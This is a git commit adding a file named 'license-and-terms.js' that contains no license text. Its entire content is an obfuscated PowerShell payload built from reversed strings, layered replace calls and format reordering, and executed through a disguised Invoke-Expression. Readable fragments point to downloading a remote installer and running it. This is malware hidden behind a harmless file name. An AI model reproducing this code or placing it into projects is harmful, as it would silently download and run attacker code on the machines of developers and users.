9553a27735ae3a34079cb661f50e9ee17901ce99
Azkic50 <Azkilohj55@gmail.com>
2025-03-30 20:57:59 -0400

    Create license-and-terms.js

---
+++ license-and-terms.js
@@ -0,0 +1,22 @@
+$xo58=  [Char[ ] ] "Xei | )421]rAhC[]gnirTS[,)56]rAhC[+28]rAhC[+311]rAhC[((ECaLpEr.)93]rAhC[]gnirTS[,)09]rAhC[+701]rAhC[+901]rAhC[((ECaLpEr.)43]rAhC[]gnirTS[,)55]rAhC[+98]rAhC[+221]rAhC[((ECaLpEr.)'$','yFl'(ECaLpEr.)')ZkmZkmNioj-]52,42,4[CEPSmoc:VnEyFl'+' (. A'+'Rq)93]RAhc[]GniRTs[,ZkmJnYZkm(ECALPEr.)ZkmARqZkm,Zkmv5YZkm(ECALPEr.))Zkm JnY+Zkm,Zkm fiJnY+JnY Zkm,ZkmY{}7{}0{}JnY+JnY2{}8{}6{}4{JnY+Jn'+'Y}5JnY+JnY{qJnY+JnY'+'3u( = )'+'plwJnY+JnYaplw({@]t'+'JnY+Zkm,ZkmrC- 93]Zkm,ZkmJnY+JnYlwnplwJnY+'+'JnY f- q3u}2{}1{JnY'+'+JnY}Jn'+'Y+JnY0{}3{JZkm,ZkmXei v5Y)29]Rahc[,Jn'+'YSG0JnYE'+'CaLperC-43]RaZkm,Zkm+JnY)pJnY+JnYl'+'JnY+JnYwJnY+JnYratSplwJnY+JnY'+'Zkm,ZkmYplJnY+JnYw,plwR/JnY+JnYplwf- q3u}3{}JnY+JnY1JnY+JnZkm,ZkmJnY  Zkm,ZkmY'+'+JnY}JnY+JnY3{JnY+JnYq3u(.      J'+'nY+JnY'+'
+}JnYZkm,Zkm  
+;Zkm,Zkm 
+{ yrt    
+JnY+JnY{ )}ATQIiadQJ'+'nY+JnYIiEJnY+JnYMQIioJnY+JnYs'+'{bwn nJnY+JnYi }IJnY+JnY{bwn( JnY+JnYhcJnY+JnYaJnY+JnYerof  JnY+JnY
+;)
+JnY+JnY})pJnY+JnYlwJnY+JnYRplw,JnY+JnYplwVpJnY+JZ'+'km,Zkm,pJ'+'nY+JnYlwecplwJnY+JnY,plwsspJnY+JnYlw,Zkm,ZkmY+JnYwbJnY+JnYpJnY+JnYl'+'w( JnY+'+'JnY;)Jn'+'Y+JnYplwisplw,plwLCQVWVJnZkm,'+'Zkmc JnY+JnY  JnY+JnY 
+JnY+JnY} JnYZkm,Zkm'+'nY+JnYsutan//:plwJnY+'+'JnY,plwismplw,plJnY+JnZkm,Zkmi  JnY+Zkm,ZkmnYlw,JnY+JnYpJnY+JnYlJnY+JnYwism.JnY+JnY0ILCQVWJnY+JnYplwJnY+JnY f- JnY+JnYq3u}0{JnY+JnY}1{JnY+JnY}2{q3u( = '+')plJnZkm,ZkmpJnY+JnYlworJnY+JnYP-tJnY+JnYplw f- JnY+JnYq3u}1{}2{}JnY+JnY0{JnZkm,ZkmnY+Jn'+'Zkm,ZkmeTplwJnZkm,Zkm+JnY   JnY+JnY JnY+JnY JnY+JnY 
+ '+';}hTQIZkm,Zkmhc[,)311]Rahc[+15]Rahc[+711]Rahc[(ECaL'+'peZkm,Zkmf-JnY+JnYq3u}1{}0JnY+JnY{q3uJnY+JnY(&( fZkm,ZkmYq3u(&JnY+JnYZkm,Zkm}aJnY+JnYTQJnY+JnYIiadEQIJnY+JnYiMJnY+JnYOS{JnY+'+'Jn'+'YbwJnY+JnYn JnY+Zkm,Zkm+JnY JnY+JnY  
+;}JnY+JnYHTQIiaPQIieJnY+JnYliQI'+'if{bwJnY+JnYnJnY+Jn'+'Y JnYZkm,ZkmaF{bwn = }dJnY+Jn'+'YAOQIJnY+JnYiLJnY+JnYNZkm,ZkmY+JnYZkm,ZkmY+JnY      
+;}eSQIiJnY+JnYl'+'QIJnY+'+'JnYiZkm,ZkmY+JnY3JnY+JnYu =JnY+JnY }JnY+JnYhTAQIipEQIJnY+JnYiLiJnY+JZkm,ZkmJnY     Zkm,ZkmJnYcJnY+JnYeJnY+JnYj'+'bOmo'+'tsuJnY+JnYCJnY+JnYSJnY+JnYP[  
+JnY+Jn'+'Y(@ JnY+JnY= JnY+JnYZk'+'m,ZkmRahc[,)211]Rahc[+801]Rahc[+911]Rahc[(  ECaLperC-  69]Rahc[,JnYQIiJnY ecalPE'+'R-  63]Rahc[,JnYbwnJnY E'+'CaLperC- )JnY  
+
+}  
+} JnY+JnY   
+{ '+'hJnY+JnYctJnY+JnYaZkm,ZkmJnY+Jn'+'YQJnY+JnYIiWJnY+JnYOD{bwJnY+JnYn     J'+'nY+JnY JnY+JnY  
+JnYZkm,ZkmnY+JnYiNWoZ'+'km,Zk'+'mJnY+JnY JnY+JnY JnY+JnY   
+ }JnZkm,ZkmJnY JnY+JnY
+
+JnY(( Zkm,Zkm  
+JnY+JnY{ )JnY+JnY}DJnY+JnYaolJnY+JnYQIJZkm,Z'+'kmYwJnY+JnYeJnY+JnYtplJnY+JnYwJnY+JnY,JnY+JnYplw.IJnY+JnZkm,ZkmY+J'+'nYpJnY+JnYlwJnY+JnY,plwbew.plw,p'+'JnY+JnYZkm,ZkmFtuJnY+JnYOJnY+JnY- q3uaq3JnY+JnYuJnY+JnY.}I{bwJnY+Jn'+'Yn irU- )plwIplw,plwdohplw,pJnY+JnYlwJnY+JnYteMtJnY+JnYsJnY+JnYeRJnY+JnY-eJnY+JnYkovplw,pZkm,ZkmlwsJnY+JnYpJnY+JnYtthplwJnY+JnY,pJnY+JnYlwsutriJnY+JnYpJnY+JnY-JZkm,ZkmY+JnYiJnY+JnYbwnJnY+JnY(bwJnY+JnYnSG0PMJnY+JnYEJnY+JnYT:JnY+JnYvneJnY+JnYbwJnY+JnYnqJnZkm,Zkm+JnY{ )}JnY+JnYHTQIiAJnY+JnYQJnY+JnYIipJnY+'+'JnYQIiElIF{bwn )plwJnY+JnYhtaP-plwJn'+'Y+JnY,plwJnY+JnYt'+'sZkm,ZkmQIiD{bwnJnY+JnY(JnY+JnYZkm,ZkmnYfJnY+JnY{bwJnY+JnYn JnY+JnY    Zkm,Zkm}JnY+JnYEuRJnY+JnYQIiT{bwn = }DAQIiO'+'LNQIiwOQIid{bwn   JnY+JnY  JnY+JnY 
+;qJnY+JnY3u)b.JnZkm,ZkmiaPEJnY+JnYlJnY+JnYQJnY+JnYIiifJnY+JnY{bwn elJnY+JnYiJnY+JnYZkm f- 7Yz}34{}62{}54{}51{}43{}22{}24{}63{}03{}93{}72{}0{}7{}44{}92{}42{}84{}71{}01{}31{}'+'3{}74{}21{}91{}12{}41{}4{}82{}02{}52{}23{}04{}83{}1{}5{}81{}2{}73{}13{'+'}53{}8'+'{}6{}33{}'+'9{}14{}'+'64{}61{}32{}11{7Yz(( '( "; [ARRAY]::REVeRSe( (  VaRIABLe  ('x'+'o58')).VALuE);(  VaRIABLe  ('x'+'o58')).VALuE -JOiN'' |&( $sheLlID[1]+$shellID[13]+'X')
